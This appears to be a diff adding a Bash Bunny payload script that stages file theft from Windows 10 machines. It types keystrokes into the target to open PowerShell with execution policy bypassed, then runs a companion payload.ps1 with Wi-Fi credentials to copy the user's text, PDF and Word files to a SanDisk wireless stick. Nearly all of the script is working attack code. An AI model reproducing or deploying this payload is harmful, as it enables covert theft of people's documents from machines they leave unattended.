@@ -1,0 +1,74 @@
+#!/bin/bash
+#
+# Title:            SanDisk Wireless Stick Exfiltration
+#
+# Description:      Files Exfiltration with "SanDisk Wireless Stick"
+#
+# Author:           TW-D
+# Version:          1.0
+# Category:         Exfiltration
+# Target:           Microsoft Windows 10
+# Attackmodes:      HID and STORAGE
+#
+# TESTED ON
+# ===============
+# Microsoft Windows 10 Family Version 1903 (PowerShell 5.1)
+# Microsoft Windows 10 Professional Version 20H2 (PowerShell 5.1)
+#
+# REQUIREMENTS
+# ===============
+# SanDisk Wireless Stick 16Go/32Go - Firmware 4.1.0 (2050)
+#
+# STATUS
+# ===============
+# Magenta solid ................................... SETUP
+# Yellow single blink ............................. ATTACK
+# Yellow double blink ............................. STAGE2
+# Yellow triple blink ............................. STAGE3
+# Green 1000ms VERYFAST blink followed by SOLID ... FINISH
+#
+
+######## INITIALIZATION ########
+
+readonly BB_LABEL="BashBunny"
+
+readonly SANDISK_SSID="HAK5-EXFIL"
+readonly SANDISK_PSK="MyS3cr3TP@sSw0rD"
+readonly SANDISK_LOOT="loots"
+readonly USER_DIRECTORY="~\\"
+readonly FILE_EXTENSION="*.txt,*.pdf,*.docx"
+
+######## SETUP ########
+
+LED SETUP
+
+ATTACKMODE HID STORAGE
+GET SWITCH_POSITION
+
+######## ATTACK ########
+
+LED ATTACK
+
+RUN WIN "powershell -NoLogo -NoProfile -ExecutionPolicy Bypass"
+Q DELAY 5000
+
+LED STAGE2
+
+Q STRING "\$BB_VOLUME = \"\$((Get-WmiObject -Class Win32_Volume -Filter \"Label LIKE '${BB_LABEL}'\").Name)payloads\\${SWITCH_POSITION}\\\""
+Q ENTER
+Q DELAY 3500
+Q STRING "CD \"\${BB_VOLUME}\""
+Q ENTER
+Q DELAY 1500
+
+LED STAGE3
+
+Q STRING ".\payload.ps1 -SSID \"${SANDISK_SSID}\" -PSK \"${SANDISK_PSK}\" -LOOT \"${SANDISK_LOOT}\" -DIRECTORY \"${USER_DIRECTORY}\" -EXTENSION \"${FILE_EXTENSION}\""
+Q ENTER
+Q DELAY 1500
+
+######## FINISH ########
+
+LED FINISH
+
+shutdown -h 0
